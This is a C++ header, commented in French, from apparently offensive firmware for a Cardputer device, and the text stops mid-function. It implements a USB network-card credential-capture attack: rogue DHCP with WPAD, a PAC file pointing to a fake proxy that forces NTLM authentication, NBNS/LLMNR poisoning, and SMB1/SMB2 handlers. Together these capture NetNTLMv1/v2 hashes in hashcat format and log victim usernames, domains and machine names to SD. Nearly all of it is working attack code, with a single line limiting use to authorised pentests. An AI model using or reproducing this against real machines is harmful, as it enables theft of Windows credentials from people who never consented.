#pragma once
// ============================================================================
//  lockpicker.h  -  NTLM-over-USB (attaque "lockpicker" P4wnP1) sur Evil-Cardputer
//
//  Le Cardputer se presente en carte reseau USB RNDIS (classe net TinyUSB 0.15.0
//  vendorisee : src/ecm_rndis_device.c + rndis_reports.c + lockpicker_glue.c),
//  sert un DHCP piege (opt 252 WPAD, routes /1), un HTTP:80 (wpad.dat -> PROXY
//  192.168.7.1:3128) et un proxy HTTP:3128 qui force une auth NTLM (407) et
//  capture le NetNTLMv2 (Type-3) -> format hashcat 5600 sur SD.
//
//  MODE GADGET A LA DEMANDE : lockpickerMenu() arme un flag NVS puis reboot.
//  Au boot, lockpickerBootHook() (TOUT en haut de setup()) detecte le flag :
//  si arme -> bascule l'USB en RNDIS (tinyusb_enable_interface AVANT USB.begin)
//  et lance la boucle d'attaque (ne revient jamais au firmware normal) ; sinon
//  boot normal inchange. ZERO RAM au boot en mode normal (rien de lourd en
//  statique ; buffers/serveurs = locaux de la boucle gadget, alloues seulement
//  si arme).
//
//  BUILD : requiert -DCFG_TUD_ECM_RNDIS=1 -DCFG_TUD_NET_MTU=1514 (classe net
//  vendorisee) et -DARDUINO_USB_CDC_ON_BOOT=0 (pour charger l'interface RNDIS
//  avant USB.begin). Voir LOCKPICKER-NTLM-DESIGN.md.
//
//  Usage autorise uniquement (pentest avec accord explicite). Capture seule :
//  pas de crack/auto-type on-device (NTLMv2 -> crack offline hashcat -m 5600).
// ============================================================================

#include <Arduino.h>
#include <USB.h>
#include <WiFi.h>
#include <WiFiUdp.h>
#include <SD.h>
#include <Preferences.h>
#include "mbedtls/base64.h"

// glue C (src/lockpicker_glue.c)
extern "C" void usbnet_enable_interface(void);
extern "C" void usbnet_netif_up(void);
extern "C" {
  #include "esp_netif.h"   // esp_netif_init() : demarre lwip_init + la tache TCP-IP (sinon crash gadget)
}

// Instrumentation : marque l'etape de bringup sur SD (survit au reboot) pour
// diagnostiquer le gadget arme (pas de serie en mode arme). Derniere ligne = l'appel fautif.
static void lpMark(const char* stage) {
  SD.mkdir("/evil"); SD.mkdir("/evil/lockpicker");
  File f = SD.open("/evil/lockpicker/boot.log", FILE_APPEND);
  if (f) { f.printf("%lu %s\n", (unsigned long)millis(), stage); f.close(); }
}

// ---- flag d'armement (NVS) ---------------------------------------------------
static bool lpArmedRead() {
  Preferences pf; if (!pf.begin("lockpick", true)) return false;
  bool a = pf.getBool("armed", false); pf.end(); return a;
}
static void lpArmedWrite(bool v) {
  Preferences pf; if (!pf.begin("lockpick", false)) return;
  pf.putBool("armed", v); pf.end();
}

// ---- compteurs live (locaux a la session gadget, pas de statique au boot) ----
struct LpState { uint32_t dhcp; uint32_t http; uint32_t ntlm407; uint32_t hashes; char last[72]; };

// ---- base64 ------------------------------------------------------------------
static int lpB64dec(const char* in, int inlen, uint8_t* out, size_t outcap) {
  size_t n = 0;
  if (mbedtls_base64_decode(out, outcap, &n, (const uint8_t*)in, inlen) != 0) return -1;
  return (int)n;
}
static String lpB64enc(const uint8_t* in, size_t len) {
  size_t cap = 4 * ((len + 2) / 3) + 1, n = 0;
  uint8_t* o = (uint8_t*)malloc(cap); if (!o) return String("");
  if (mbedtls_base64_encode(o, cap, &n, in, len) != 0) { free(o); return String(""); }
  o[n] = 0; String s((char*)o); free(o); return s;
}
static String lpHex(const uint8_t* b, int n) {
  static const char* H = "0123456789abcdef"; String s; s.reserve(n * 2);
  for (int i = 0; i < n; i++) { s += H[b[i] >> 4]; s += H[b[i] & 15]; } return s;
}
// UTF-16LE -> ASCII (best-effort, pour user/domain NTLM)
static String lpUtf16(const uint8_t* b, int len) {
  String s; for (int i = 0; i + 1 < len; i += 2) if (b[i] && b[i] < 0x80) s += (char)b[i]; return s;
}

// server challenge fixe = celui de Responder (facilite le crack / rainbow)
static const uint8_t LP_CHALLENGE[8] = { 0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88 };

// ---- construit un NTLMSSP Type-2 CHALLENGE minimal mais valide ---------------
static int lpBuildType2(uint8_t* out) {
  // target name "EVIL" en UTF-16LE
  const uint8_t tname[] = { 'E',0,'V',0,'I',0,'L',0 };
  // target info : MsvAvNbDomainName("EVIL") + MsvAvEOL
  uint8_t tinfo[64]; int ti = 0;
  tinfo[ti++]=0x02; tinfo[ti++]=0x00;            // AvId = MsvAvNbDomainName
  tinfo[ti++]=8;    tinfo[ti++]=0x00;            // len
  memcpy(tinfo+ti, tname, 8); ti += 8;
  tinfo[ti++]=0x00; tinfo[ti++]=0x00; tinfo[ti++]=0x00; tinfo[ti++]=0x00;  // MsvAvEOL

  int n = 0;
  memcpy(out+n, "NTLMSSP\0", 8); n += 8;
  out[n++]=2; out[n++]=0; out[n++]=0; out[n++]=0;                 // Type 2
  int payload = 48;                                               // header fixe = 8+4+8+4+8+8+8 (pas de champ Version)
  // TargetName fields -> payload
  uint16_t tnl = 8; out[n++]=tnl; out[n++]=0; out[n++]=tnl; out[n++]=0;
  out[n++]=payload; out[n++]=0; out[n++]=0; out[n++]=0;
  // NegotiateFlags : UNICODE|REQUEST_TARGET|NTLM|TARGET_INFO|TARGET_TYPE_SERVER
  uint32_t fl = 0x00000001 | 0x00000004 | 0x00000200 | 0x00800000 | 0x00020000;
  out[n++]=fl&0xFF; out[n++]=(fl>>8)&0xFF; out[n++]=(fl>>16)&0xFF; out[n++]=(fl>>24)&0xFF;
  memcpy(out+n, LP_CHALLENGE, 8); n += 8;                         // ServerChallenge
  memset(out+n, 0, 8); n += 8;                                   // Reserved
  // TargetInfo fields -> payload + tnl
  out[n++]=ti; out[n++]=0; out[n++]=ti; out[n++]=0;
  out[n++]=payload+tnl; out[n++]=0; out[n++]=0; out[n++]=0;
  // payload
  memcpy(out+n, tname, 8); n += 8;
  memcpy(out+n, tinfo, ti); n += ti;
  return n;
}

// ---- parse un NTLMSSP Type-3 AUTH -> ligne hashcat (5600 si NTLMv2, 5500 si NTLMv1) ----
// La longueur de NtChallengeResponse decide : 24 o = NetNTLMv1 (DES), >24 = NetNTLMv2 (HMAC-MD5).
// Un vrai Windows envoie du v2 ; certains clients (curl --proxy-ntlm) envoient du v1 -> on stocke
// chacun dans son format hashcat pour qu'il soit crackable.
static bool lpParseType3(const uint8_t* b, int len, String& outLine) {
  if (len < 64 || memcmp(b, "NTLMSSP\0", 8) != 0) return false;
  if (b[8] != 3) return false;
  auto field = [&](int off, uint16_t& l, uint32_t& o) {
    // NTLMSSP security buffer : Len(2)@off, MaxLen(2)@off+2, BufferOffset(4)@off+4 (MS-NLMP).
    l = b[off] | (b[off+1] << 8);
    o = b[off+4] | (b[off+5] << 8) | (b[off+6] << 16) | (b[off+7] << 24);
  };
  uint16_t lmL, ntL, domL, usrL; uint32_t lmO, ntO, domO, usrO;
  field(12, lmL, lmO);   // LmChallengeResponse
  field(20, ntL, ntO);   // NtChallengeResponse
  field(28, domL, domO); // DomainName
  field(36, usrL, usrO); // UserName
  if (ntO + ntL > (uint32_t)len || ntL < 24) return false;
  if (domO + domL > (uint32_t)len || usrO + usrL > (uint32_t)len) return false;
  String user = lpUtf16(b + usrO, usrL);
  String dom  = lpUtf16(b + domO, domL);
  const uint8_t* nt = b + ntO;
  String chal = lpHex(LP_CHALLENGE, 8);
  if (ntL == 24) {
    // NetNTLMv1 (hashcat -m 5500) : user::domain:LMresp:NTresp:serverchallenge
    String ntResp = lpHex(nt, 24);
    String lmResp = (lmL == 24 && lmO + lmL <= (uint32_t)len) ? lpHex(b + lmO, 24) : ntResp;
    outLine = user + "::" + dom + ":" + lmResp + ":" + ntResp + ":" + chal;
  } else {
    // NetNTLMv2 (hashcat -m 5600) : user::domain:serverchallenge:NTProof:blob
    String proof = lpHex(nt, 16);
    String blob  = lpHex(nt + 16, ntL - 16);
    outLine = user + "::" + dom + ":" + chal + ":" + proof + ":" + blob;
  }
  return user.length() > 0;
}

static void lpSaveHash(const String& line) {
  SD.mkdir("/evil"); SD.mkdir("/evil/lockpicker");
  File f = SD.open("/evil/lockpicker/ntlm.txt", FILE_APPEND);
  if (f) { f.println(line); f.close(); }
}

// ---- info victime de la derniere capture (pour l'UI : alerte WARN + liste) ----
static char lpCapUser[32] = "", lpCapDom[32] = "", lpCapMach[32] = "";
static volatile uint32_t lpCapAt = 0;        // millis de la derniere capture (flash warn)
static volatile uint32_t lpCapTotal = 0;     // total NTLMv2 capturés (proxy + SMB)
#define LP_CAP_RING 6
static char lpCapLog[LP_CAP_RING][56];
static int  lpCapLogHead = 0, lpCapLogCount = 0;

static void lpUtf16c(const uint8_t* b, int len, char* out, int cap) {
  int j = 0; for (int i = 0; i + 1 < len && j < cap - 1; i += 2) if (b[i] && b[i] < 0x80) out[j++] = (char)b[i];
  out[j] = 0;
}
// extrait user(off36) / domaine(off28) / workstation=machine(off44) d'un NTLMSSP Type-3
static void lpNoteCapture(const uint8_t* b, int len) {
  auto fld = [&](int off, uint16_t& l, uint32_t& o) {
    if (off + 8 > len) { l = 0; o = 0; return; }
    l = b[off] | (b[off+1] << 8);
    o = b[off+4] | (b[off+5] << 8) | (b[off+6] << 16) | (b[off+7] << 24);
  };
  uint16_t dL, uL, wL; uint32_t dO, uO, wO;
  fld(28, dL, dO); fld(36, uL, uO); fld(44, wL, wO);
  lpCapUser[0] = lpCapDom[0] = 0; strcpy(lpCapMach, "?");
  if (uO + uL <= (uint32_t)len) lpUtf16c(b + uO, uL, lpCapUser, sizeof lpCapUser);
  if (dO + dL <= (uint32_t)len) lpUtf16c(b + dO, dL, lpCapDom, sizeof lpCapDom);
  if (wL && wO + wL <= (uint32_t)len) lpUtf16c(b + wO, wL, lpCapMach, sizeof lpCapMach);
  snprintf(lpCapLog[lpCapLogHead], 56, "%s\\%s @ %s",
           lpCapDom[0] ? lpCapDom : "?", lpCapUser[0] ? lpCapUser : "?", lpCapMach);
  lpCapLogHead = (lpCapLogHead + 1) % LP_CAP_RING;
  if (lpCapLogCount < LP_CAP_RING) lpCapLogCount++;
  lpCapAt = millis(); lpCapTotal++;
}

// ============================ serveurs gadget =================================
// DHCP piege : OFFER/ACK avec opt 3/6/44 = self, 252 WPAD, 121 routes /1.
static void lpDhcp(WiFiUDP& udp, LpState& st) {
  uint8_t in[600];
  int n = udp.parsePacket(); if (n <= 0) return;
  int len = udp.read(in, sizeof(in));
  if (len < 240 || in[0] != 1) return;
  if (!(in[236]==0x63 && in[237]==0x82 && in[238]==0x53 && in[239]==0x63)) return;
  uint8_t type = 0; { int i = 240; while (i < len) { uint8_t c=in[i]; if(c==255)break; if(c==0){i++;continue;} if(c==53){type=in[i+2];break;} i+=2+in[i+1]; } }
  uint8_t reply = (type==1)?2:(type==3)?5:0; if (!reply) return;
  uint8_t p[400]; memset(p,0,sizeof(p));
  p[0]=2; p[1]=1; p[2]=6; memcpy(p+4,in+4,4);
  p[16]=192;p[17]=168;p[18]=7;p[19]=2;                 // yiaddr
  p[20]=192;p[21]=168;p[22]=7;p[23]=1;                 // siaddr
  memcpy(p+28,in+28,16);
  p[236]=0x63;p[237]=0x82;p[238]=0x53;p[239]=0x63;
  int o=240;
  p[o++]=53;p[o++]=1;p[o++]=reply;
  p[o++]=54;p[o++]=4;p[o++]=192;p[o++]=168;p[o++]=7;p[o++]=1;
  p[o++]=51;p[o++]=4;p[o++]=0;p[o++]=0;p[o++]=0x0E;p[o++]=0x10;
  p[o++]=1; p[o++]=4;p[o++]=255;p[o++]=255;p[o++]=255;p[o++]=0;
  p[o++]=3; p[o++]=4;p[o++]=192;p[o++]=168;p[o++]=7;p[o++]=1;
  p[o++]=6; p[o++]=4;p[o++]=192;p[o++]=168;p[o++]=7;p[o++]=1;
  p[o++]=44;p[o++]=4;p[o++]=192;p[o++]=168;p[o++]=7;p[o++]=1;
  { const char* w="http://192.168.7.1/wpad.dat"; uint8_t wl=strlen(w); p[o++]=252;p[o++]=wl;memcpy(p+o,w,wl);o+=wl; }
  p[o++]=121;p[o++]=14; p[o++]=1;p[o++]=0; p[o++]=192;p[o++]=168;p[o++]=7;p[o++]=1;
  p[o++]=1;p[o++]=128; p[o++]=192;p[o++]=168;p[o++]=7;p[o++]=1;
  p[o++]=255;
  udp.beginPacket(IPAddress(255,255,255,255),68); udp.write(p,o); udp.endPacket();
  if (reply==5) st.dhcp++;
}

// HTTP:80 -> sert wpad.dat (PAC vers le proxy) + page temoin.
static void lpHttp80(WiFiServer& srv, LpState& st) {
  WiFiClient c = srv.available(); if (!c) return;
  uint32_t t0=millis(); String req;
  while (c.connected() && millis()-t0<1000) { if (c.available()){ req+=(char)c.read(); if (req.endsWith("\r\n\r\n")) break; } }
  st.http++;
  if (req.indexOf("wpad.dat")>=0) {
    const char* pac="function FindProxyForURL(url,host){return \"PROXY 192.168.7.1:3128; DIRECT\";}";
    c.print("HTTP/1.1 200 OK\r\nContent-Type: application/x-ns-proxy-autoconfig\r\n");
    c.printf("Content-Length: %u\r\nConnection: close\r\n\r\n",(unsigned)strlen(pac)); c.print(pac);
  } else {
    const char* b="<html><body>Evil NIC 192.168.7.1</body></html>";
    c.print("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n");
    c.printf("Content-Length: %u\r\nConnection: close\r\n\r\n",(unsigned)strlen(b)); c.print(b);
  }
  c.flush(); delay(4); c.stop();
}

// Proxy:3128 -> 407 NTLM, handshake, capture Type-3 (NetNTLMv2 -> hashcat 5600).
// NTLM est "connection-oriented" : on garde la socket ouverte sur les 3 etapes.
static void lpProxy3128(WiFiServer& srv, LpState& st) {
  WiFiClient c = srv.available(); if (!c) return;
  uint32_t dead = millis() + 8000;
  while (c.connected() && millis() < dead) {
    String req; uint32_t t0 = millis();
    while (c.connected() && millis()-t0 < 3000) {
      if (c.available()) { req += (char)c.read(); if (req.endsWith("\r\n\r\n")) break; }
    }
    if (req.length() == 0) break;
    // cherche "Proxy-Authorization: NTLM <b64>"
    int pa = req.indexOf("Proxy-Authorization: NTLM ");
    if (pa < 0) pa = req.indexOf("Proxy-Authorization: Negotiate ");
    if (pa < 0) {
      st.ntlm407++;
      c.print("HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: NTLM\r\n"
              "Proxy-Connection: keep-alive\r\nContent-Length: 0\r\n\r\n");
      continue;
    }
    int vs = req.indexOf(' ', pa + 21) + 1;   // pa+21 = debut du mot-cle de schema (NTLM/Negotiate), evite l'espace apres ':'
    int ve = req.indexOf('\r', vs); if (ve < 0) ve = req.length();
    String tok = req.substring(vs, ve); tok.trim();
    uint8_t msg[1024];
    int ml = lpB64dec(tok.c_str(), tok.length(), msg, sizeof(msg));
    if (ml < 12 || memcmp(msg, "NTLMSSP\0", 8) != 0) { c.stop(); return; }
    uint8_t mtype = msg[8];
    if (mtype == 1) {                                    // NEGOTIATE -> envoie CHALLENGE
      uint8_t t2[256]; int t2l = lpBuildType2(t2);
      String b64 = lpB64enc(t2, t2l);
      c.printf("HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: NTLM %s\r\n"
               "Proxy-Connection: keep-alive\r\nContent-Length: 0\r\n\r\n", b64.c_str());
      continue;
    }
    if (mtype == 3) {                                    // AUTH -> capture
      String line;
      if (lpParseType3(msg, ml, line)) {
        lpSaveHash(line); st.hashes++; lpNoteCapture(msg, ml);
        strncpy(st.last, line.c_str(), sizeof(st.last)-1); st.last[sizeof(st.last)-1]=0;
      }
      c.print("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
      c.stop(); return;
    }
    c.stop(); return;
  }
  c.stop();
}

// ============================ boucle gadget ===================================
// Ne revient JAMAIS (reboot pour sortir). Tout en local = zero RAM boot normal.
// ---- Responder "version ancienne" : empoisonnement NBNS/LLMNR + capture SMB1 NTLM ----
// Self-contained : REUTILISE les fonctions deja compilees du .ino (handleSMB1 ->
// sendSMB1NegotiateResponse/sendSMB1Type2/extractAndPrintHash) et les globals
// smbServer/smbState/nbnsUDP/llmnrUDP. Ne touche PAS responder() (feature WiFi validee).
// Logique de capture deja prouvee en natif (tools/lp_smb_sim.cpp -> crack Password123!).
// IP spoofee = selfIP (192.168.7.1 en mode gadget). NBNS = broadcast (sans IGMP) ;
// LLMNR = multicast 224.0.0.252 (best-effort : KO si le netif USB n'a pas IGMP) ;
// SMB1 = chaine "version ancienne" (les clients SMB2-first restent couverts par le proxy WPAD).
// ============================================================================
//  Capture SMB2 (NEGOTIATE + SESSION_SETUP NTLMSSP). Win10/11 ont retiré SMB1 :
//  sans ce chemin, la victime moderne parle SMB2 (\xFESMB) et on ne capturait
//  rien. Code validé en natif contre un vrai client SMB2 (impacket) + crack
//  hashcat -m 5600 (voir tools/lp_smb2_port.h + harnais). Réutilise
//  buildNTLMType2Msg (.ino) + lpParseType3/lpSaveHash.
// ============================================================================
static int lpSmb2Stage = 0;   // 0 = attend NEGOTIATE/SETUP1 ; incrémenté par SESSION_SETUP

static void lpAsnLen(uint8_t* b, int& n, int v) {
  if (v < 128) { b[n++] = (uint8_t)v; }
  else if (v < 256) { b[n++] = 0x81; b[n++] = (uint8_t)v; }
  else { b[n++] = 0x82; b[n++] = (uint8_t)(v >> 8); b[n++] = (uint8_t)(v & 0xff); }
}
// SPNEGO NegTokenResp (accept-incomplete + supportedMech NTLMSSP) autour d'un Type-2 brut
static int lpSpnego(uint8_t* out, const uint8_t* ntlm, int nlen) {
  uint8_t oct[700]; int on = 0; oct[on++] = 0x04; lpAsnLen(oct, on, nlen);
  memcpy(oct + on, ntlm, nlen); on += nlen;
  uint8_t rt[720]; int rn = 0; rt[rn++] = 0xA2; lpAsnLen(rt, rn, on);
  memcpy(rt + rn, oct, on); rn += on;
  const uint8_t mech[] = {0xA1,0x0C,0x06,0x0A,0x2B,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0A};
  const uint8_t neg[]  = {0xA0,0x03,0x0A,0x01,0x01};
  uint8_t sb[760]; int sn = 0;
  memcpy(sb + sn, neg, sizeof neg); sn += sizeof neg;
  memcpy(sb + sn, mech, sizeof mech); sn += sizeof mech;
  memcpy(sb + sn, rt, rn); sn += rn;
  uint8_t seq[780]; int qn = 0; seq[qn++] = 0x30; lpAsnLen(seq, qn, sn);
  memcpy(seq + qn, sb, sn); qn += sn;
  int n = 0; out[n++] = 0xA1; lpAsnLen(out, n, qn);
  memcpy(out + n, seq, qn); n += qn;
  return n;
}
static void lpSmb2Hdr(uint8_t* o, uint16_t cmd, uint32_t status, const uint8_t* mid, uint64_t sid, uint16_t cc) {
  o[0]=0xFE;o[1]='S';o[2]='M';o[3]='B'; o[4]=64;o[5]=0; o[6]=cc&0xff;o[7]=(cc>>8)&0xff;
  memcpy(o + 8, &status, 4);
  o[12]=cmd&0xff;o[13]=(cmd>>8)&0xff; o[14]=1;o[15]=0;
  o[16]=1;o[17]=0;o[18]=0;o[19]=0;                     // Flags = SERVER_TO_REDIR
  o[20]=o[21]=o[22]=o[23]=0;
  memcpy(o + 24, mid, 8);                              // MessageId (echo)
  o[32]=0xFF;o[33]=0xFE;o[34]=0;o[35]=0; o[36]=o[37]=o[38]=o[39]=0;
  memcpy(o + 40, &sid, 8);                             // SessionId
  memset(o + 48, 0, 16);
}
static int lpSmb2Negotiate(uint8_t* o, const uint8_t* mid, uint16_t cc) {
  lpSmb2Hdr(o, 0x0000, 0, mid, 0, cc); int n = 64;
  o[n++]=65;o[n++]=0;
  o[n++]=0x01;o[n++]=0x00;            // SecurityMode = SIGNING_ENABLED (pas REQUIRED)
  o[n++]=0x10;o[n++]=0x02;            // DialectRevision 2.1
  o[n++]=0;o[n++]=0;
  for (int i=0;i<16;i++) o[n++]=0x11;
  o[n++]=1;o[n++]=0;o[n++]=0;o[n++]=0;
  o[n++]=0;o[n++]=0;o[n++]=0x10;o[n++]=0;
  o[n++]=0;o[n++]=0;o[n++]=0x10;o[n++]=0;
  o[n++]=0;o[n++]=0;o[n++]=0x10;o[n++]=0;
  uint64_t ts = getWindowsTimestamp(); memcpy(o + n, &ts, 8); n += 8;
  memset(o + n, 0, 8); n += 8;
  o[n++]=0x80;o[n++]=0;               // SecurityBufferOffset = 128
  o[n++]=0;o[n++]=0;                  // SecurityBufferLength = 0 (vide -> SPNEGO côté client)
  o[n++]=0;o[n++]=0;o[n++]=0;o[n++]=0;
  return n;
}
static int lpSmb2Session1(uint8_t* o, const uint8_t* mid, uint64_t sid, uint16_t cc,
                          const uint8_t* t2, int t2len) {
  lpSmb2Hdr(o, 0x0001, 0xC0000016, mid, sid, cc); int n = 64;   // MORE_PROCESSING_REQUIRED
  uint8_t sp[900]; int spn = lpSpnego(sp, t2, t2len);
  o[n++]=9;o[n++]=0; o[n++]=0;o[n++]=0;
  o[n++]=72;o[n++]=0;                 // SecurityBufferOffset = 64 + 8
  o[n++]=spn&0xff;o[n++]=(spn>>8)&0xff;
  memcpy(o + n, sp, spn); n += spn;
  return n;
}
static int lpSmb2Session2(uint8_t* o, const uint8_t* mid, uint64_t sid, uint16_t cc, uint32_t status) {
  lpSmb2Hdr(o, 0x0001, status, mid, sid, cc); int n = 64;
  o[n++]=9;o[n++]=0; o[n++]=0;o[n++]=0; o[n++]=0;o[n++]=0; o[n++]=0;o[n++]=0;
  return n;
}
static int lpFindNtlmssp(const uint8_t* b, int n) {
  for (int i = 0; i + 8 <= n; i++) if (memcmp(b + i, "NTLMSSP\0", 8) == 0) return i;
  return -1;
}
static void lpSmb2Send(WiFiClient& cl, const uint8_t* msg, int n) {
  uint8_t pre[4] = {0, (uint8_t)((n>>16)&0xff), (uint8_t)((n>>8)&0xff), (uint8_t)(n&0xff)};
  cl.write(pre, 4); cl.write(msg, n);
}
static void lpHandleSMB2(uint8_t* pkt, int len) {
  if (len < 64) return;
  uint16_t cmd = pkt[12] | (pkt[13] << 8);
  uint16_t cc  = pkt[6] | (pkt[7] << 8);
  const uint8_t* mid = pkt + 24;
  static uint8_t sbuf[1200];
  static const uint64_t sid = 0x0000000000334455ULL;
  if (cmd == 0x0000) {                         // NEGOTIATE
    int n = lpSmb2Negotiate(sbuf, mid, cc); lpSmb2Send(smbState.client, sbuf, n);
  } else if (cmd == 0x0001) {                  // SESSION_SETUP
    lpSmb2Stage++;
    if (lpSmb2Stage == 1) {
      uint8_t t2[600]; uint16_t t2len = 0; uint8_t chal[8]; memcpy(chal, LP_CHALLENGE, 8);
      buildNTLMType2Msg(chal, t2, &t2len);
      int n = lpSmb2Session1(sbuf, mid, sid, cc, t2, t2len); lpSmb2Send(smbState.client, sbuf, n);
    } else {
      int off = lpFindNtlmssp(pkt, len); String line;
      if (off >= 0 && lpParseType3(pkt + off, len - off, line)) { lpSaveHash(line); hashCount++; lpNoteCapture(pkt + off, len - off); lpMark("smb2-capture"); }
      int n = lpSmb2Session2(sbuf, mid, sid, cc, 0xC000006D); lpSmb2Send(smbState.client, sbuf, n);  // LOGON_FAILURE
    }
  }
}

static void lpResponderPoll(IPAddress selfIP) {
  // --- NBNS (UDP 137) : repond a toute requete de nom -> selfIP ---
  if (nbnsUDP.parsePacket() > 0) {
    uint8_t buf[100]; int len = nbnsUDP.read(buf, sizeof(buf));
    if (len >= 50) {
      uint16_t flags = (buf[2] << 8) | buf[3];
      uint16_t qd    = (buf[4] << 8) | buf[5];
      uint16_t qt    = (buf[len - 4] << 8) | buf[len - 3];
      uint16_t qc    = (buf[len - 2] << 8) | buf[len - 1];
      if ((flags & 0x8000) == 0 && qd >= 1 && qt == 0x0020 && qc == 0x0001 && buf[12] == 0x20) {
        uint8_t r[80];
        r[0]=buf[0]; r[1]=buf[1]; r[2]=0x84; r[3]=0x00;
        r[4]=0;r[5]=0; r[6]=0;r[7]=1; r[8]=0;r[9]=0; r[10]=0;r[11]=0;
        memcpy(r + 12, buf + 12, 34);
        r[46]=0x00;r[47]=0x20; r[48]=0x00;r[49]=0x01;
        r[50]=0;r[51]=0;r[52]=0;r[53]=0x3C; r[54]=0x00;r[55]=0x06; r[56]=0;r[57]=0;
        r[58]=selfIP[0]; r[59]=selfIP[1]; r[60]=selfIP[2]; r[61]=selfIP[3];
        nbnsUDP.beginPacket(nbnsUDP.remoteIP(), nbnsUDP.remotePort());
        nbnsUDP.write(r, 62); nbnsUDP.endPacket();
        lpMark("nbns-answer");
      }
    }
  }
  // --- LLMNR (UDP 5355 multicast) : repond A / AAAA -> selfIP ---
  if (llmnrUDP.parsePacket() > 0) {
    uint8_t buf[300]; int len = llmnrUDP.read(buf, sizeof(buf));
    if (len >= 12) {
      uint16_t flags = (buf[2] << 8) | buf[3];
      uint16_t qd    = (buf[4] << 8) | buf[5];
      uint16_t an    = (buf[6] << 8) | buf[7];
      uint8_t nameLen = buf[12];
      if (!(flags & 0x8000) && qd != 0 && an == 0 && nameLen && nameLen < 64 &&
          (13 + nameLen + 4) <= len && buf[13 + nameLen] == 0x00) {
        const uint8_t* qp = buf + 13 + nameLen + 1;
        uint16_t qt = (qp[0] << 8) | qp[1];
        uint16_t qc = (qp[2] << 8) | qp[3];
        bool isA = (qt == 0x0001);
        if ((isA || qt == 0x001C) && qc == 0x0001) {
          uint16_t qlen = 1 + nameLen + 1 + 2 + 2;
          uint8_t r[350];
          r[0]=buf[0];r[1]=buf[1]; r[2]=0x84;r[3]=0x00; r[4]=0;r[5]=1; r[6]=0;r[7]=1;
          r[8]=0;r[9]=0; r[10]=0;r[11]=0;
          memcpy(r + 12, buf + 12, qlen);
          uint16_t ao = 12 + qlen;
          r[ao]=0xC0; r[ao+1]=0x0C; r[ao+2]=qp[0]; r[ao+3]=qp[1];
          r[ao+4]=0;r[ao+5]=1; r[ao+6]=0;r[ao+7]=0; r[ao+8]=0;r[ao+9]=0x1E;
          if (isA) {
            r[ao+10]=0;r[ao+11]=4;
            r[ao+12]=selfIP[0];r[ao+13]=selfIP[1];r[ao+14]=selfIP[2];r[ao+15]=selfIP[3];
            llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
            llmnrUDP.write(r, ao + 16); llmnrUDP.endPacket();
          } else {
            r[ao+10]=0;r[ao+11]=0x10; memset(r + ao + 12, 0, 10);
            r[ao+22]=0xFF;r[ao+23]=0xFF;
            r[ao+24]=selfIP[0];r[ao+25]=selfIP[1];r[ao+26]=selfIP[2];r[ao+27]=selfIP[3];
            llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
            llmnrUDP.write(r, ao + 28); llmnrUDP.endPacket();
          }
          lpMark("llmnr-answer");
        }
      }
    }
  }
  // --- SMB (TCP 445) : accepte + dispatch SMB1 (meme logique que responder()) ---
  if (!smbState.active) {
    WiFiClient nc = smbServer.available();
    if (nc) { smbState.client = nc; smbState.active = true; smbState.sessionId = 0; lpSmb2Stage = 0; lpMark("smb-accept"); }
  }
  if (smbState.active && smbState.client.connected()) {
    smbState.client.setTimeout(100);
    if (smbState.client.available() >= 4) {
      uint8_t nbss[4];
      if (smbState.client.read(nbss, 4) == 4) {
        uint32_t smbLen = ((uint32_t)nbss[1] << 16) | ((uint32_t)nbss[2] << 8) | nbss[3];
        if (smbLen > 0 && smbLen < 16384) {
          uint8_t* pkt = (uint8_t*)malloc(smbLen);
          if (pkt) {
            uint32_t rd = 0; uint32_t t0 = millis();          // lecture robuste : un Type-3 SMB2 peut etre segmente
            while (rd < smbLen && millis() - t0 < 600) {
              int k = smbState.client.read(pkt + rd, smbLen - rd);
              if (k > 0) { rd += (uint32_t)k; t0 = millis(); } else delay(2);
            }
            if (rd == smbLen && smbLen >= 4 && pkt[1] == 'S' && pkt[2] == 'M' && pkt[3] == 'B') {
              if (pkt[0] == 0xFE) {                           // SMB2 (Win10/11 par defaut)
                lpHandleSMB2(pkt, smbLen);
              } else if (pkt[0] == 0xFF) {                    // SMB1
                bool wants2 = false;                          // client annonce "SMB 2.???" -> upgrade SMB2
                for (uint32_t i = 0; i + 9 <= smbLen; i++)
                  if (memcmp(pkt + i, "SMB 2.???", 9) == 0) { wants2 = true; break; }
                if (wants2) { uint8_t o[256]; uint8_t zmid[8] = {0}; int n = lpSmb2Negotiate(o, zmid, 0); lpSmb2Send(smbState.client, o, n); }
                else handleSMB1(pkt, smbLen);                 // legacy SMB1 pur
              }
            }
            free(pkt);
          }
        }
      }
    }
  } else if (smbState.active && !smbState.client.connected()) {
    smbState.client.stop(); smbState.active = false;
  }
}

static void lpGadgetRun() {
  // 0) pile lwIP/TCP-IP : normalement demarree par WiFi (tcpipInit) -> ABSENTE ici
  //    (le bootHook tourne avant tout WiFi). Sans ca, le 1er appel lwIP (netif_up /
  //    serveurs) crashe (mailbox TCP-IP NULL). esp_netif_init() est idempotent.
  lpMark("0-pre-netif-init"); esp_netif_init();

  // 1) USB en RNDIS (interface AVANT USB.begin ; netif UP avant USB.begin pour que
  //    la tache usbd ne delivre pas de trame vers un netif.input NULL)
  lpMark("1-enable-itf");  usbnet_enable_interface();
  lpMark("2-productName"); USB.productName("Evil-Cardputer NIC");
  lpMark("3-netif-up");    usbnet_netif_up();
  lpMark("4-usb-begin");   USB.begin();

  // 2) serveurs (sockets lwIP INADDR_ANY -> netif USB)
  lpMark("5-http80"); WiFiServer http80(80);  http80.begin();
  lpMark("6-proxy");  WiFiServer proxy(3128); proxy.begin();
  lpMark("7-dhcp");   WiFiUDP dhcp;           dhcp.begin(67);
  // Responder "version ancienne" : NBNS (137) + LLMNR (5355 mcast, best-effort) + SMB (445)
  lpMark("7b-nbns");  nbnsUDP.begin(NBNS_PORT);
  lpMark("7c-llmnr"); llmnrUDP.beginMulticast(IPAddress(224,0,0,252), LLMNR_PORT);
  lpMark("7d-smb");   smbServer.begin(); smbState.active = false; hashCount = 0;
  lpMark("8-loop-enter");

  LpState st; memset(&st, 0, sizeof(st));
